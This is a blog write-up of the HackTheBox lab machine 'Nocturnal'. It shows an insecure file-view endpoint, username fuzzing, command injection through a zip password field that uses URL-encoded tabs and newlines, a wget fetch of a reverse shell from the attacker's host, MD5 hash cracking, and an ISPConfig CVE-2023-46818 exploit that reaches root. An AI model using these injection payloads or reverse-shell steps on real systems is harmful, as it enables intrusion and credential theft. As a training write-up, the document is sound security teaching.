---
title: Nocturnal
date: 2025-04-19 12:57:00 +0200
categories: [HackTheBox, Machines]
tags: [boot2root]
description: Hack The Box - Nocturnal from season 7. Easy linux machine.
image: /assets/img/HTB/Nocturnal/Nocturnal.png
---

>**Platform:** HackTheBox

>**Category:** Linux

>**Rating:** Easy

>**Solves:** 1914


## Abstract
This machine presents you with a website that allows you to upload certain filetypes. A flaw in the websites code allows users to view each others uploaded files. Fuzzing usernames reveals a user: amanda and reading an uploaded file of hers reveals a password. This can be used to escalate priviliges on the website, where you will have access to additional features. Bypass the input sanitisation to get code execution on the server and use this to get an initial shell. Obtain and crack a password hash from a database on the server. This provides you with SSH credentials for the user which has the user flag.
From there you will discover a locally hosted web interface for ISPConfig. Using the same credentials, you can log in to the admin panel. Discover the ISP version and the corresponding CVE-2023-46818, which allows an admin user to execute malicious input by editing a language file. Using a PoC python script you can obtain a shell as root which allows you to read the root flag.

## User Flag

### Enumeration Phase 1

Nmap will reveal only an open SSH port and a website on port 80.
Initially I tried to upload some simple PHP reverse shells, but with no success.
Then I ran Hydra against the login form with username `admin` also to no success.

But exploring the website further I found that file uploads are viewed using a `view.php` script. Further it is revealed in the URL how this request works:
```
http://nocturnal.htb/view.php?username=pu1tz&file=test.pdf
```
Toying with these parameters, a valid username with an invalid file returns: `File does not exist.` but an invalid username with an valid filename returns: `User not found.`

This implies that there is no authentication when requesting to view a file. If all users are able to view each others files, we could potentially view all files if we could guess the filenames, however this might be difficult and I don't have a great list for filename enumeration (plus multiple file extensions are allowed so it would take a loooong time to enumerate).
I did first try:
```
http://nocturnal.htb/view.php?username=admin&file=user.pdf
```
Just to see if I were lucky, but sadly not.
However we might more easily exploit the fact that other users can view OUR files.
If we upload our own file, we know that filename is guaranteed to exist and enumerating usernames is much simpler.
For this to work we first need to find out how to filter a valid request from an invalid one.
This can be done by inspecting the size of the request (both valid and invalid requests return status: 200, so status codes cannot be used).
>Using Firefox developer tools, you can monitor this in the 'Network' section.
{: .prompt-tip }

This is an example of 2 requests where I have uploaded a file named: `test.pdf`

| Status | Method | File                                            | Size  |
| ------ | ------ | ----------------------------------------------- | ----- |
| 200    | GET    | view.php?username=pu1tz&file=test.pdf           | 3724B |
| 200    | GET    | view.php?username=InvalidUsername&file=test.pdf | 2985B |

### Exploitation Phase 1

```sh
┌──(kali㉿kali)-[~]
└─$ ffuf -u 'http://nocturnal.htb/view.php?username=FUZZ&file=test.pdf' -w ../SecLists/Usernames/xato-net-10-million-usernames.txt -H 'Cookie: PHPSESSID=tl6upcrisnqd21ot6bc2vr0q7n' -fs 2985 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://nocturnal.htb/view.php?username=FUZZ&file=test.pdf
 :: Wordlist         : FUZZ: /home/kali/Desktop/SecLists/Usernames/xato-net-10-million-usernames.txt
 :: Header           : Cookie: PHPSESSID=tl6upcrisnqd21ot6bc2vr0q7n
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 2985
________________________________________________

admin                   [Status: 200, Size: 3037, Words: 1174, Lines: 129, Duration: 25ms]
qwerty                  [Status: 200, Size: 3281, Words: 1177, Lines: 129, Duration: 36ms]
phoenix                 [Status: 200, Size: 3118, Words: 1175, Lines: 129, Duration: 19ms]
amanda                  [Status: 200, Size: 3205, Words: 1176, Lines: 129, Duration: 19ms]
tester                  [Status: 200, Size: 3193, Words: 1176, Lines: 129, Duration: 472ms]
tobias                  [Status: 200, Size: 3037, Words: 1174, Lines: 129, Duration: 19ms]
admin1                  [Status: 200, Size: 3109, Words: 1175, Lines: 129, Duration: 17ms]
```
>Note that you might find non-default users created by other people on the box, like most of the ones I found above.
{: .prompt-tip }

Exploring this I find the below file on the user account: `amanda` (admin doesn't have any files). She doesn't have my `test.pdf` file, however we can see all other files she has available.
![](/assets/img/HTB/Nocturnal/HTB-Nocturnal-amanda.png)

Inspecting this file I found a thumbnail, which showed the content of a letter about a password reset. This was hard to read due to the quality, so I ran `strings` on the entire directory to get the password:
```sh
┌──(kali㉿kali)-[~/Desktop/HTB]
└─$ strings Nocturnal | grep -r 'you:'
Nocturnal has set the following temporary password for you: arHkG***. This password has been set for all our services, ...
```

Logging in on this account we are represented with the following page:
![](/assets/img/HTB/Nocturnal/HTB-Nocturnal-amandapage.png)

It appears this user has admin priviliges. The admin panel looks as such:
![](/assets/img/HTB/Nocturnal/HTB-Nocturnal-adminpanel.png)

Inspecting the file `admin.php` shows how the admin panel works, and how backups are generated. The most interesting part is the following lines:

```php
$command = "zip -x './backups/*' -r -P " . $password . " " . $backupFile . " .  > " . $logFile . " 2>&1 &";
...
$blacklist_chars = [';', '&', '|', '$', ' ', '`', '{', '}', '&&'];
```

This shows that the password entered for the zip file will be used in the above command. Note also that there is a dedicated function for sanitizing the password input.
We can get around this by changing the request after it has passed the sanitizing check using BurpSuite:

```
POST /admin.php?view=admin.php HTTP/1.1
Host: nocturnal.htb
...
Referer: http://nocturnal.htb/admin.php?view=admin.php
Cookie: PHPSESSID=djqjj9dug8sh85e97u6q0eimmc
Upgrade-Insecure-Requests: 1
Priority: u=0, i

password=bash%09-c%09"whoami"%0A&backup=
```

>Here we have to use URL encoding to pass special characters.
>`%09` is the URL encoding of space: `' '`
>`%0A` is a newline character: `'\n'`
{: .prompt-tip }

This returns the following response (shortened):

```html
<p>Backup created successfully.</p>
<a href='backups/backup_2025-04-19.zip' class='download-button' download>
Download Backup</a>
<h3>Output:</h3>
<pre>sh: 2: backups/backup_2025-04-19.zip: Permission denied
www-data
</pre>
```

This means we can execute commands on the server as `www-data`.

Now I craft a reverse shell in bash and serve it on a simple python server with `python3 -m http.server`, then we can download that reverse shell onto the server and execute it.
`password=bash%09-c%09"wget%0910.10.XX.XX:8000/revshell"%0A&backup=`

Then we can listen for connections with *netcat* and send another request to execute the script.
`password=bash%09-c%09"bash%09revshell"%0A&backup=`
>The server doesnt recognise `cmd` so you cant use that in your script - I used: *bash read line*
{: .prompt-tip }

And this gives us a reverse shell as *www-data*.
A quick orientation on the server reveals 2 things of interest. Our user has access to a database and *ispconfig* which is hosted locally as a web interface.

```sh
┌──(kali㉿kali)-[~/Desktop/HTB/Nocturnal]
└─$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.XX.XX] from (UNKNOWN) [10.10.11.64] 47058

pwd
/var/www/nocturnal.htb

cd ..
ls -la
total 24
drwxr-xr-x  6 ispconfig ispconfig 4096 Apr 14 09:26 .
drwxr-xr-x 14 root      root      4096 Oct 18  2024 ..
drwxr-xr-x  2 root      root      4096 Mar  4 15:02 html
lrwxrwxrwx  1 root      root        34 Oct 17  2024 ispconfig -> /usr/local/ispconfig/interface/web
drwxr-xr-x  4 www-data  www-data  4096 Apr 20 10:26 nocturnal.htb
drwxr-xr-x  2 www-data  www-data  4096 Apr 20 10:30 nocturnal_database
drwxr-xr-x  4 ispconfig ispconfig 4096 Oct 17  2024 php-fcgi-scripts
```

Firstly lets explore the database - It's a small database of users, so I just used *cat* on the server to get the hashes. This reveals the password hashes of 3 default users: **admin, amanda, tobias** 

```
admin  : d725aeba143f575736b07e045d8ceebb
amanda : df8b20aa0c935023f99ea58358fb63c4
tobias : 55c82b1***
```

These seem to be **MD5** hashes, using *CrackStation* [^1] only finds a result for one; tobias.

Then i'll try logging in with **SSH** since that is available at port 22 as discovered earlier.
```sh
┌──(kali㉿kali)-[~/Desktop/HTB/Nocturnal]
└─$ ssh tobias@10.10.11.64
tobias@10.10.11.64 s password:

tobias@nocturnal:~$ ls
user.txt
```

## Root Flag

### Enumeration Phase 2

There doesn't seem to be a lot that can be done as this user - no *sudo* permissions and no noteworthy programs running with elevated priviliges.
So I'm going to look closer into this ispconfig running locally. Listing the active sockets we can see that there is a few different port open on *localhost*.

```sh
tobias@nocturnal:~$ ss -tuln
Netid     State      Recv-Q     Send-Q          Local Address:Port            Peer Address:Port     Process     
udp       UNCONN     0          0               127.0.0.53%lo:53                   0.0.0.0:*                    
tcp       LISTEN     0          151                 127.0.0.1:3306                 0.0.0.0:*                    
tcp       LISTEN     0          10                  127.0.0.1:587                  0.0.0.0:*                    
tcp       LISTEN     0          4096                127.0.0.1:8080                 0.0.0.0:*                    
tcp       LISTEN     0          511                   0.0.0.0:80                   0.0.0.0:*                    
tcp       LISTEN     0          4096            127.0.0.53%lo:53                   0.0.0.0:*                    
tcp       LISTEN     0          128                   0.0.0.0:22                   0.0.0.0:*                    
tcp       LISTEN     0          10                  127.0.0.1:25                   0.0.0.0:*                    
tcp       LISTEN     0          70                  127.0.0.1:33060                0.0.0.0:*                    
tcp       LISTEN     0          128                      [::]:22                      [::]:*
```

Websites are commonly hosted on ports `80 & 8080` so likely port 8080 is where the web interface is hosted. Since it is hosted locally on the server we can't access it directly. We can use *ssh* with the tag `-L` to specify an address that will allow us to access this on out local machine. (on port *1234*)

```sh
┌──(kali㉿kali)-[~/Desktop/HTB/Nocturnal]
└─$ ssh tobias@10.10.11.64 -L 1234:127.0.0.1:8080
```

Then going to the specified URL we are redirected to `/login` where we are presented with the following screen:

![](/assets/img/HTB/Nocturnal/HTB-Nocturnal-url.png){: width="222" height="37" }

![](/assets/img/HTB/Nocturnal/HTB-Nocturnal-login.png){: width="431" height="407" }

First I tried using already obtained credentials to login, but this didn't work - until I tried username: **admin** with the password of **tobias**... This logs us in as admin, where we are presented with an admin panel.
Inspecting the page source reveals some additional information, including the ispconfig version.

```html
<head>
	...
	<link rel="stylesheet"
	href="../themes/default/assets/stylesheets/ispconfig.css?ver=3.2">
	...
</head>
```

Going to the *Monitor* panel more specifically reveals the version to be: **ISPConfig 3.2.10p1**.

### Exploitation Phase 2

Some research shows that all versions from *v3.2* until *v3.2.11p1* can be vulnerable -
**CVE-2023-46818**. The vulnerability applies to systems where the admin can configure language files. This is the case for this machine, as can be seen by navigating to: **System -> Language Editor** in the web interface.

A Python exploit already exists for this CVE as a PoC on GitHub. [^2]

```sh
┌──(kali㉿kali)-[~/Desktop/HTB/Nocturnal/CVE-2023-46818-python-exploit]
└─$ python exploit.py http://127.0.0.1:1234/ admin ****
[+] Target URL: http://127.0.0.1:1234/
[+] Logging in with username 'admin' and password '****'
[+] Injecting shell
[+] Launching shell

ispconfig-shell# whoami
root

ispconfig-shell# cat /root/root.txt
0ca4****
```

### References
[^1]:[https://crackstation.net/](https://crackstation.net/)
[^2]:[https://github.com/bipbopbup/CVE-2023-46818-python-exploit](https://github.com/bipbopbup/CVE-2023-46818-python-exploit)